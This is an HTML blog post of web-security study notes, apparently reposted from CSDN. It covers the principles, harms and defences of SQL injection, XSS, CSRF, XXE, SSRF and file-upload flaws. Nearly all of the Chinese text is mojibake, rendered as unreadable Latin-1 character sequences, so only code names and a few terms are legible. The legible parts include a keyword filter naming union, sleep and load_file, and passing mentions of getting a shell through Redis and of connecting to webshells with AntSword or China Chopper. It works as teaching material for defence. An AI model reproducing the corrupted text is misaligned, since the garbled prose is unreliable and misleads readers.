<p><code>å¥½è®°æ€§ä¸å¦‚çƒ‚ç¬”å¤´ï¼Œä¸€äº›çŸ¥è¯†ç‚¹è¿˜æ˜¯è¦å¤šå†™å‡ éæ¥è®°ä½ï¼Œä¸æ˜¯ç®€å•ctrl+c/+vå°±å­¦åˆ°äº†ï¼Œä¸Šæœºè‡ªå·±ç»ƒä¹ ï¼Œæ‰“é¶åœºï¼Œæ°¸è¿œæ˜¯æœ€æœ‰æ•ˆçš„æ–¹æ³•ï¼Œä¸€å®šå­¦ä¼šæ–‡ç« å’Œå®é™…æ“ä½œå¯†åˆ‡ç»“åˆï¼ŒåšæŒåšç¬”è®°</code></p>
<p><code>å­¦ä¸œè¥¿å°±åªå½“å­¦ä¸€æ¬¡ï¼Œä¸€æ¬¡å­¦åˆ°æœ€å¥½ï¼Œä¸è¦å›«å›µåæ£</code></p>
<hr>
<p>æ€è·¯ç»å¯¹ä¸è¦è¢«å±€é™ï¼ï¼ï¼</p>
<span id="more"></span>

<h1 id="åŸºç¡€æ¼æ´çŸ¥è¯†"><a href="#åŸºç¡€æ¼æ´çŸ¥è¯†" class="headerlink" title="åŸºç¡€æ¼æ´çŸ¥è¯†"></a>åŸºç¡€æ¼æ´çŸ¥è¯†</h1><blockquote>
<p>â€“è½¬è½½åŸæ–‡é“¾æ¥ï¼š<a href="https://blog.csdn.net/c_programj/article/details/117452836">https://blog.csdn.net/c_programj/article/details/117452836</a></p>
</blockquote>
<h2 id="ä¸€ã€sqlæ¼æ´ç¯‡"><a href="#ä¸€ã€sqlæ¼æ´ç¯‡" class="headerlink" title="ä¸€ã€sqlæ¼æ´ç¯‡"></a>ä¸€ã€sqlæ¼æ´ç¯‡</h2><blockquote>
<p><a href="#%E4%B8%80%E3%80%81sql">sqlæ¼æ´çŸ¥è¯†ç‚¹è®°å½•</a></p>
</blockquote>
<h3 id="1-sqlæ¼æ´åŸç†"><a href="#1-sqlæ¼æ´åŸç†" class="headerlink" title="1.sqlæ¼æ´åŸç†"></a>1.sqlæ¼æ´åŸç†</h3><p>æŒ‡webåº”ç”¨ç¨‹åº<u><strong>å¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®åˆæ³•æ€§æ²¡æœ‰åˆ¤æ–­</strong></u>ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥<u><strong>æ„é€ ä¸åŒçš„sqlè¯­å¥æ¥å¯¹æ•°æ®åº“æ•°æ®åº“çš„æ“ä½œ</strong></u>ã€‚ï¼ˆwebåº”ç”¨ç¨‹åºå¯¹ç”¨æˆ·è¾“å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œæˆ–è€…è¿‡æ»¤ä¸ä¸¥ï¼Œå°±æŠŠsqlè¯­å¥å¸¦è¿›æ•°æ®åº“ä¸­è¿›è¡ŒæŸ¥è¯¢ï¼‰ã€‚</p>
<blockquote>
<p>Sqlæ³¨å…¥æ¼æ´çš„äº§ç”Ÿéœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š<br>â‘ å‚æ•°ç”¨æˆ·å¯æ§ï¼š<u><strong>å‰ç«¯ä¼ ç»™åç«¯çš„å‚æ•°å†…å®¹æ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„</strong></u>ã€‚<br>â‘¡<u><strong>å‚æ•°ä»£å…¥æ•°æ®åº“æŸ¥è¯¢</strong></u>ï¼šä¼ å…¥çš„å‚æ•°æ‹¼æ¥åˆ°sqlè¯­å¥ï¼Œä¸”å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚</p>
</blockquote>
<h3 id="2-å±å®³"><a href="#2-å±å®³" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote>
<p>â‘ æ•°æ®åº“ä¿¡æ¯æ³„æ¼ï¼šæ•°æ®åº“ä¸­å­˜æ”¾çš„<u><strong>ç”¨æˆ·çš„éšç§ä¿¡æ¯çš„æ³„éœ²</strong></u>ã€‚<br>â‘¡ç½‘é¡µç¯¡æ”¹ï¼šé€šè¿‡æ“ä½œæ•°æ®åº“å¯¹ç‰¹å®šç½‘é¡µè¿›è¡Œç¯¡æ”¹ã€‚<br>â‘¢ç½‘ç«™è¢«æŒ‚é©¬ï¼Œä¼ æ’­æ¶æ„è½¯ä»¶ï¼š<u><strong>ä¿®æ”¹æ•°æ®åº“ä¸€äº›å­—æ®µçš„å€¼ï¼ŒåµŒå…¥ç½‘é©¬é“¾æ¥</strong></u>ï¼Œè¿›è¡ŒæŒ‚é©¬æ”»å‡»ã€‚<br>â‘£æ•°æ®åº“è¢«æ¶æ„æ“ä½œï¼šæ•°æ®åº“æœåŠ¡å™¨è¢«æ”»å‡»ï¼Œæ•°æ®åº“çš„ç³»ç»Ÿç®¡ç†å‘˜å¸æˆ·è¢«çªœæ”¹ã€‚<br>â‘¤æœåŠ¡å™¨è¢«è¿œç¨‹æ§åˆ¶ï¼Œè¢«å®‰è£…åé—¨ã€‚ç»ç”±æ•°æ®åº“æœåŠ¡å™¨æä¾›çš„æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œè®©é»‘å®¢å¾—ä»¥ä¿®æ”¹æˆ–æ§åˆ¶æ“ä½œç³»ç»Ÿã€‚<br>â‘¥ç ´åç¡¬ç›˜æ•°æ®ï¼Œç˜«ç—ªå…¨ç³»ç»Ÿã€‚</p>
</blockquote>
<h3 id="3-é˜²å¾¡"><a href="#3-é˜²å¾¡" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>â‘ <u><strong>è¿‡æ»¤å±é™©å­—ç¬¦</strong></u>ï¼šä¾‹å¦‚ï¼Œé‡‡ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…unionã€sleepã€load_fileç­‰å…³é”®å­—ï¼Œå¦‚æœåŒ¹é…åˆ°ï¼Œåˆ™é€€å‡ºç¨‹åºã€‚<br>â‘¡ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ï¼šä½¿ç”¨PDOé¢„ç¼–è¯‘è¯­å¥ï¼Œéœ€è¦æ³¨æ„ï¼Œä¸è¦å°†å˜é‡ç›´æ¥æ‹¼æ¥åˆ°PDOè¯­å¥ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨å ä½ç¬¦è¿›è¡Œæ•°æ®åº“çš„å¢åŠ ã€åˆ é™¤ã€ä¿®æ”¹ã€æŸ¥è¯¢ã€‚<br>â‘¢ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ã€ä½¿ç”¨ä¸¥æ ¼çš„æ•°æ®ç±»å‹ã€‚</p>
</blockquote>
<h2 id="äºŒã€xssæ¼æ´ç¯‡"><a href="#äºŒã€xssæ¼æ´ç¯‡" class="headerlink" title="äºŒã€xssæ¼æ´ç¯‡"></a>äºŒã€xssæ¼æ´ç¯‡</h2><h3 id="1-xssæ¼æ´åŸç†"><a href="#1-xssæ¼æ´åŸç†" class="headerlink" title="1.xssæ¼æ´åŸç†"></a>1.xssæ¼æ´åŸç†</h3><p>æ¶æ„æ”»å‡»è€…<u><strong>å¾€Webé¡µé¢é‡ŒåµŒå…¥è„šæœ¬ä»£ç </strong></u>ï¼ˆ<u><strong>é€šå¸¸æ˜¯JavaScriptç¼–å†™çš„æ¶æ„ä»£ç </strong></u>ï¼‰ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚ï¼ˆæ¶æ„æ”»å‡»è€…<u><strong>åˆ©ç”¨ç½‘ç«™æ²¡æœ‰å¯¹ç”¨æˆ·æäº¤æ•°æ®è¿›è¡Œè½¬ä¹‰å¤„ç†æˆ–è€…è¿‡æ»¤ä¸è¶³çš„ç¼ºç‚¹ï¼Œè¿›è€Œæ·»åŠ ä¸€äº›ä»£ç </strong></u>ï¼ŒåµŒå…¥åˆ°webé¡µé¢ä¸­å»ã€‚ï¼‰</p>
<h3 id="2-å±å®³-1"><a href="#2-å±å®³-1" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote>
<p>â‘ ç›—å–ç”¨æˆ·Cookieã€‚<br>â‘¡ä¿®æ”¹ç½‘é¡µå†…å®¹ã€‚<br>â‘¢ç½‘ç«™æŒ‚é©¬ã€‚<br>â‘£åˆ©ç”¨ç½‘ç«™é‡å®šå‘ã€‚<br>â‘¤XSSè •è™«ã€‚</p>
</blockquote>
<h3 id="3-é˜²å¾¡-1"><a href="#3-é˜²å¾¡-1" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>â‘ è¿‡æ»¤è¾“å…¥çš„æ•°æ®ï¼šåŒ…æ‹¬â€ â€™ â€ã€â€&lt;â€ã€â€œ&lt;â€ã€â€œ&gt;â€ã€â€œonâ€ç­‰éæ³•å­—ç¬¦ã€‚<br>â‘¡å¯¹è¾“å‡ºåˆ°é¡µé¢çš„æ•°æ®è¿›è¡Œç›¸åº”çš„ç¼–ç è½¬æ¢ï¼ŒåŒ…æ‹¬htmlå®ä½“ç¼–ç ã€javascriptç¼–ç ç­‰ã€‚</p>
</blockquote>
<h2 id="ä¸‰ã€csrfæ¼æ´ç¯‡"><a href="#ä¸‰ã€csrfæ¼æ´ç¯‡" class="headerlink" title="ä¸‰ã€csrfæ¼æ´ç¯‡"></a>ä¸‰ã€csrfæ¼æ´ç¯‡</h2><h3 id="1-csrfæ¼æ´åŸç†"><a href="#1-csrfæ¼æ´åŸç†" class="headerlink" title="1.csrfæ¼æ´åŸç†"></a>1.csrfæ¼æ´åŸç†</h3><p>å› ä¸ºwebåº”ç”¨ç¨‹åºåœ¨ç”¨æˆ·è¿›è¡Œæ•æ„Ÿæ“ä½œæ—¶ï¼Œå¦‚ä¿®æ”¹è´¦å·å¯†ç ã€æ·»åŠ è´¦å·ã€è½¬è´¦ç­‰ï¼Œ<u><strong>æ²¡æœ‰æ ¡éªŒè¡¨å•tokenæˆ–è€…httpè¯·æ±‚å¤´ä¸­çš„refererå€¼</strong></u>ï¼ˆå¦‚æœæ‚¨<u><strong>åœ¨ç½‘é¡µ1ï¼Œç‚¹å‡»ä¸€ä¸ªé“¾æ¥åˆ°ç½‘é¡µ2</strong></u>ï¼Œå½“æµè§ˆå™¨<u><strong>è¯·æ±‚ç½‘é¡µ2æ—¶ï¼Œç½‘é¡µ1çš„URLå°±ä¼šåŒ…å«åœ¨ Referer å¤´ä¿¡æ¯</strong></u>ä¸­ï¼‰ï¼Œä»è€Œ<u><strong>å¯¼è‡´æ¶æ„æ”»å‡»è€…åˆ©ç”¨æ™®é€šç”¨æˆ·çš„èº«ä»½ï¼ˆcookieï¼‰å®Œæˆæ”»å‡»è¡Œä¸º</strong></u>ã€‚</p>
<p><img src="/post/Web-study/image-20230803154603968.png" alt="image-20230803154603968"></p>
<p>Csrfæ”»å‡»è¿‡ç¨‹ä¸¤ä¸ªé‡ç‚¹ï¼š</p>
<blockquote>
<p>â‘ ç›®æ ‡ç”¨æˆ·<u><strong>å·²ç»ç™»å½•äº†ç½‘ç«™</strong></u>ï¼Œ<u><strong>èƒ½å¤Ÿæ‰§è¡Œç½‘ç«™çš„åŠŸèƒ½</strong></u>ã€‚<br>â‘¡ç›®æ ‡ç”¨æˆ·<u><strong>è®¿é—®äº†æ”»å‡»è€…æ„é€ çš„URL</strong></u>ã€‚</p>
</blockquote>
<h3 id="2-å±å®³-2"><a href="#2-å±å®³-2" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote>
<p>â‘ ä¼ªé€ HTTPè¯·æ±‚è¿›è¡Œæœªæˆæƒæ“ä½œã€‚<br>â‘¡ç¯¡æ”¹ã€ç›—å–ç›®æ ‡ç½‘ç«™ä¸Šçš„é‡è¦ç”¨æˆ·æ•°æ®ã€‚<br>â‘¢æœªç»å…è®¸æ‰§è¡Œå¯¹ç”¨æˆ·åèª‰æˆ–è€…èµ„äº§æœ‰å®³çš„æ“ä½œï¼Œæ¯”å¦‚ï¼šæ•£æ’­ä¸è‰¯ä¿¡æ¯ã€è¿›è¡Œæ¶ˆè´¹ç­‰ã€‚<br>â‘£å¦‚æœé€šè¿‡ä½¿ç”¨ç¤¾å·¥ç­‰æ–¹å¼æ”»å‡»ç½‘ç«™ç®¡ç†å‘˜ã€ä¼šå±å®³ç½‘ç«™æœ¬èº«çš„å®‰å…¨æ€§ã€‚<br>â‘¤ä½œä¸ºå…¶ä»–æ”»å‡»å‘é‡çš„è¾…åŠ©æ”»å‡»æ‰‹æ³•ï¼Œå¿…é¡»é…åˆXSS<br>â‘¥ä¼ æ’­CSRFè •è™«</p>
</blockquote>
<h3 id="3-é˜²å¾¡-2"><a href="#3-é˜²å¾¡-2" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>â‘ éªŒè¯è¯·æ±‚çš„<u><strong><code>referer</code></strong></u>å€¼ï¼Œå¦‚æœrefereræ˜¯ä»¥è‡ªå·±çš„ç½‘ç«™å¼€å¤´çš„åŸŸåï¼Œåˆ™è¯´æ˜è¯¥è¯·æ±‚æ¥è‡ªç½‘ç«™è‡ªå·±ï¼Œæ˜¯åˆæ³•çš„ã€‚<u><strong>å¦‚æœrefereræ˜¯å…¶ä»–ç½‘ç«™åŸŸåæˆ–ç©ºç™½ï¼Œå°±æœ‰å¯èƒ½æ˜¯csrfæ”»å‡»ï¼Œé‚£ä¹ˆæœåŠ¡å™¨æ‹’ç»è¯¥è¯·æ±‚</strong></u>ï¼Œä½†æ˜¯æ­¤æ–¹æ³•å­˜åœ¨è¢«ç»•è¿‡çš„å¯èƒ½ã€<u><strong>brupsuiteå¯ä»¥æŠ“åŒ…ä¿®æ”¹refererä»è€Œç»•è¿‡å‰ç«¯è¿‡æ»¤</strong></u>ã€‘ã€‚<br>â‘¡csrfæ”»å‡»ä¹‹æ‰€ä»¥èƒ½æˆåŠŸï¼Œæ˜¯å› ä¸º<u><strong>æ”»å‡»è€…ä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚</strong></u>ï¼Œæ‰€ä»¥æŠµå¾¡csrfçš„å…³é”®åœ¨äºï¼šåœ¨<u><strong>è¯·æ±‚ä¸­æ”¾å…¥æ”»å‡»è€…ä¸èƒ½ä¼ªé€ çš„è¯·æ±‚</strong></u>ï¼Œä¾‹å¦‚ï¼Œå¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯<u><strong>éªŒè¯token</strong></u>ã€<u><strong>ç±»ä¼¼äºéªŒè¯ç </strong></u>ã€‘ï¼Œå¦‚æœè¯·æ±‚ä¸­æ²¡æœ‰tokenæˆ–è€…tokenå†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºè¯·æ±‚å¯èƒ½æ˜¯csrfæ”»å‡»ï¼Œä»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚</p>
</blockquote>
<h2 id="å››ã€xxeæ¼æ´ç¯‡"><a href="#å››ã€xxeæ¼æ´ç¯‡" class="headerlink" title="å››ã€xxeæ¼æ´ç¯‡"></a>å››ã€xxeæ¼æ´ç¯‡</h2><h3 id="1-xxeæ¼æ´åŸç†"><a href="#1-xxeæ¼æ´åŸç†" class="headerlink" title="1.xxeæ¼æ´åŸç†"></a>1.xxeæ¼æ´åŸç†</h3><p>XML å¤–éƒ¨å®ä½“æ”»å‡»æ˜¯é’ˆå¯¹è§£æ XML è¾“å…¥çš„åº”ç”¨ç¨‹åºçš„ä¸€ç§æ”»å‡»ã€‚å½“<strong>åŒ…å«å¯¹å¤–éƒ¨å®ä½“çš„å¼•ç”¨çš„ XML è¾“å…¥ç”±å¼±é…ç½®çš„ XML è§£æå™¨å¤„ç†</strong>æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æ”»å‡»ã€‚è¿™ç§æ”»å‡»å¯èƒ½å¯¼è‡´<strong>æœºå¯†æ•°æ®æ³„éœ²ã€æ‹’ç»æœåŠ¡ã€æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ã€ä»è§£æå™¨æ‰€åœ¨æœºå™¨çš„è§’åº¦è¿›è¡Œç«¯å£æ‰«æ</strong>ç­‰ç³»ç»Ÿå½±å“ã€‚</p>
<p>æ”»å‡»å¯èƒ½åŒ…æ‹¬ä½¿ç”¨ç³»ç»Ÿæ ‡è¯†ç¬¦ä¸­çš„ <code>file: æ–¹æ¡ˆæˆ–ç›¸å¯¹è·¯å¾„å…¬å¼€æœ¬åœ°æ–‡ä»¶</code>ï¼Œè¿™äº›æ–‡ä»¶<strong>å¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®ï¼Œä¾‹å¦‚å¯†ç æˆ–ç§äººç”¨æˆ·æ•°æ®</strong>ã€‚ç”±äº<strong>æ”»å‡»å‘ç”Ÿä¸å¤„ç† XML æ–‡æ¡£çš„åº”ç”¨ç¨‹åºç›¸å…³</strong>ï¼Œå› æ­¤<strong>æ”»å‡»è€…å¯èƒ½ä¼šä½¿ç”¨æ­¤å—ä¿¡ä»»çš„åº”ç”¨ç¨‹åºè½¬å‘å…¶ä»–å†…éƒ¨ç³»ç»Ÿ</strong>ï¼Œå¯èƒ½é€šè¿‡ http(s) è¯·æ±‚æ³„éœ²å…¶ä»–å†…éƒ¨å†…å®¹æˆ–<strong>å¯¹ä»»ä½•æœªå—ä¿æŠ¤çš„å†…éƒ¨æœåŠ¡å‘èµ· CSRF æ”»å‡»</strong>ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ˜“å—å®¢æˆ·ç«¯å†…å­˜æŸåé—®é¢˜å½±å“çš„ XML å¤„ç†å™¨åº“<strong>å¯èƒ½ä¼šé€šè¿‡è§£é™¤å¯¹æ¶æ„ URI çš„å¼•ç”¨è€Œè¢«åˆ©ç”¨</strong>ï¼Œ<strong>ä»è€Œå¯èƒ½å…è®¸åœ¨åº”ç”¨ç¨‹åºå¸æˆ·ä¸‹æ‰§è¡Œä»»æ„ä»£ç </strong>ã€‚å…¶ä»–æ”»å‡»å¯ä»¥è®¿é—®å¯èƒ½ä¸ä¼šåœæ­¢è¿”å›æ•°æ®çš„æœ¬åœ°èµ„æºï¼Œ</p>
<p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥åŒºåˆ†ä»¥ä¸‹å‡ ç§ XXE æ”»å‡»ï¼š</p>
<blockquote>
<ul>
<li>å…¸å‹æ³¨å…¥ï¼šåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¤–éƒ¨å®ä½“åŒ…å«åœ¨æœ¬åœ° DTD ä¸­</li>
<li>ç›²æ³¨ï¼šå“åº”ä¸­æ²¡æœ‰æ˜¾ç¤ºè¾“å‡ºå’Œ&#x2F;æˆ–é”™è¯¯</li>
<li>æŠ¥é”™æ³¨å…¥ï¼šå°è¯•åœ¨é”™è¯¯æ¶ˆæ¯ä¸­è·å–èµ„æºçš„å†…å®¹</li>
</ul>
</blockquote>
<p>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬<u><strong>XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ </strong></u>ã€‚</p>
<h3 id="2-å±å®³-3"><a href="#2-å±å®³-3" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><blockquote>
<p>â‘ è¯»å–ä»»æ„æ–‡ä»¶ã€‚<br>â‘¡æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚<br>â‘¢æ¢æµ‹å†…ç½‘ç«¯å£ã€‚<br>â‘£æ”»å‡»å†…ç½‘ç½‘ç«™ã€‚</p>
</blockquote>
<h3 id="3-é˜²å¾¡-3"><a href="#3-é˜²å¾¡-3" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>â‘ ç¦æ­¢ä½¿ç”¨<u><strong>å¤–éƒ¨å®ä½“</strong></u>ï¼Œä¾‹å¦‚ï¼š<br>PHPï¼šlibxml_disable_entity_loader(true)<br>â‘¡è¿‡æ»¤ç”¨æˆ·æäº¤çš„xmlæ•°æ®ï¼Œé˜²æ­¢å‡ºç°éæ³•å†…å®¹ã€‚</p>
</blockquote>
<h2 id="äº”ã€ssrfæ¼æ´ç¯‡"><a href="#äº”ã€ssrfæ¼æ´ç¯‡" class="headerlink" title="äº”ã€ssrfæ¼æ´ç¯‡"></a>äº”ã€ssrfæ¼æ´ç¯‡</h2><h3 id="1-ssrfæ¼æ´åŸç†"><a href="#1-ssrfæ¼æ´åŸç†" class="headerlink" title="1.ssrfæ¼æ´åŸç†"></a>1.ssrfæ¼æ´åŸç†</h3><p>å¤§éƒ½æ˜¯ç”±äº<u><strong>æœåŠ¡å™¨æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</strong></u>ä¸”<u><strong>æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶</strong></u><strong>ã€‚æ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ã€‚</strong><u><strong>åˆ©ç”¨çš„æ˜¯æœåŠ¡ç«¯çš„è¯·æ±‚ä¼ªé€ </strong></u>ã€‚SSRFæ˜¯åˆ©ç”¨å­˜åœ¨ç¼ºé™·çš„webåº”ç”¨ä½œä¸ºä»£ç†æ”»å‡»è¿œç¨‹å’Œæœ¬åœ°çš„æœåŠ¡å™¨ã€‚</p>
<p><img src="/post/Web-study/image-20220802103546644.png" alt="image-20220802103546644"></p>
<p><img src="/post/Web-study/image-20220802103603770.png" alt="image-20220802103603770"></p>
<h3 id="2-å±å®³-4"><a href="#2-å±å®³-4" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p>æ”»å‡»è€…å°±å¯ä»¥<u><strong>åˆ©ç”¨è¯¥æ¼æ´ç»•è¿‡é˜²ç«å¢™ç­‰è®¿é—®é™åˆ¶</strong></u>ï¼Œè¿›è€Œå°†å—æ„ŸæŸ“æˆ–å­˜åœ¨æ¼æ´çš„æœåŠ¡å™¨ä½œä¸ºä»£ç†è¿›è¡Œç«¯å£æ‰«æï¼Œç”šè‡³æ˜¯è®¿é—®å†…éƒ¨ç³»ç»Ÿæ•°æ®ã€‚</p>
<blockquote>
<p>1.å¯ä»¥å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„banner ä¿¡æ¯</p>
<p>2.æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº</p>
<p>3.å¯¹å†…ç½‘ WEB åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å®ç°(å¦‚ï¼šreadmeæ–‡ä»¶)</p>
<p>4.æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ GET å‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»(å¦‚ï¼šStruts2ï¼Œsqli)</p>
<p>5.ä¸‹è½½å†…ç½‘èµ„æº(å¦‚ï¼šåˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ç­‰)</p>
<p>6.è¿›è¡Œè·³æ¿</p>
<p>7.æ— è§†cdn</p>
<p>8.åˆ©ç”¨Redisæœªæˆæƒè®¿é—®ï¼ŒHTTP CRLFæ³¨å…¥å®ç°getshell</p>
</blockquote>
<h3 id="3-é˜²å¾¡-4"><a href="#3-é˜²å¾¡-4" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>â‘  é™åˆ¶è¯·æ±‚çš„ç«¯å£åªèƒ½ä¸ºwebç«¯å£ï¼Œåªå…è®¸è®¿é—®HTTPå’ŒHTTPSè¯·æ±‚ã€‚<br>â‘¡ é™åˆ¶ä¸èƒ½è®¿é—®å†…ç½‘çš„IPï¼Œä»¥é˜²æ­¢å¯¹å†…ç½‘è¿›è¡Œæ”»å‡»ã€‚<br>â‘¢ å±è”½è¿”å›çš„è¯¦ç»†ä¿¡æ¯ã€‚<br>â‘£ é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸ºHTTPå¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ 80,443,8080,8088ç­‰ã€‚</p>
</blockquote>
<blockquote>
<p>PHPä¸­ä¸‹é¢å‡½æ•°çš„ä½¿ç”¨ä¸å½“ä¼šå¯¼è‡´SSRF:</p>
<p>file_get_contents()</p>
<p>fsockopen()<br>#åœ¨PHPä¸­fsockopenå‡½æ•°çš„ä½œç”¨æ˜¯æ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnixå¥—æ¥å­—è¿æ¥ï¼Œå…¶è¯­æ³•ä¸ºâ€œfsockopen($hostname) â€ï¼Œè¿”å›å€¼ä¸ºä¸€ä¸ªæ–‡ä»¶å¥æŸ„ï¼Œä¹‹åå¯ä»¥è¢«å…¶ä»–æ–‡ä»¶ç±»å‡½æ•°è°ƒç”¨</p>
<p>curl_exec()</p>
</blockquote>
<h2 id="å…­ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ç¯‡"><a href="#å…­ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ç¯‡" class="headerlink" title="å…­ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ç¯‡"></a>å…­ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ç¯‡</h2><h3 id="1-æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†"><a href="#1-æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†" class="headerlink" title="1.æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†"></a>1.æ–‡ä»¶ä¸Šä¼ æ¼æ´åŸç†</h3><p>å°±æ˜¯æœªå¯¹ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œå¯¼è‡´æŸäº›åˆ«æœ‰ç”¨å¿ƒçš„ç”¨æˆ·ä¸Šä¼ äº†ä¸€äº›æ¶æ„ä»£ç æˆ–æ–‡ä»¶ï¼ˆ<code>aspã€phpã€jsp</code>ç­‰ï¼‰ï¼Œä»è€Œæ§åˆ¶äº†ç½‘ç«™ã€‚ï¼ˆå½“æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œå¦‚æœæœåŠ¡ç«¯çš„è„šæœ¬è¯­è¨€æ²¡æœ‰å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥å’Œè¿‡æ»¤ï¼Œé‚£å‡å¦‚ï¼Œæ¸—é€è€…ç›´æ¥ä¸Šä¼ æ¶æ„ä»£ç æ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ç›´æ¥æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œæˆ–è€…è¯´ä»¥æ­¤ä¸ºè·³æ¿ï¼Œç›´æ¥æ‹¿ä¸‹æœåŠ¡å™¨ï¼Œè¿™å°±æ˜¯æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚ï¼‰</p>
<h3 id="2-å±å®³-5"><a href="#2-å±å®³-5" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p><u><strong>éæ³•ç”¨æˆ·å¯ä»¥åˆ©ç”¨æ¶æ„è„šæœ¬æ–‡ä»¶æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œç”šè‡³æ§åˆ¶æœåŠ¡å™¨</strong></u>ã€‚è¿™ä¸ªæ¶æ„è„šæœ¬æ–‡ä»¶ï¼Œåˆç§°ä¸ºwebshellï¼Œä¹Ÿå¯å°†webshellè„šæœ¬ç§°ä¸ºä¸€ç§ç½‘é¡µåé—¨ï¼Œwebshellè„šæœ¬å…·æœ‰å¾ˆå¼ºå¤§çš„åŠŸèƒ½ï¼Œ<u><strong>æ¯”å¦‚æŸ¥çœ‹æœåŠ¡å™¨ç›®å½•ã€æœåŠ¡å™¨ä¸­çš„æ–‡ä»¶ï¼Œæ‰§è¡Œç»•è¿‡å‘½ä»¤ç­‰ã€‚</strong></u>ã€<strong>ç”¨èšå‰‘æˆ–èœåˆ€è¿æ¥ä¸Šä¼ çš„ phpæ–‡ä»¶ï¼Œè¾“å…¥æ–‡ä»¶ä¸­çš„å¯†ç </strong>ã€‘</p>
<h3 id="3-é˜²å¾¡-5"><a href="#3-é˜²å¾¡-5" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>â‘ é€šè¿‡ç™½åå•æ–¹å¼åˆ¤æ–­æ–‡ä»¶åç¼€æ˜¯å¦åˆæ³•ã€‚<br>â‘¡å¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œé‡å‘½åã€‚</p>
</blockquote>
<hr>
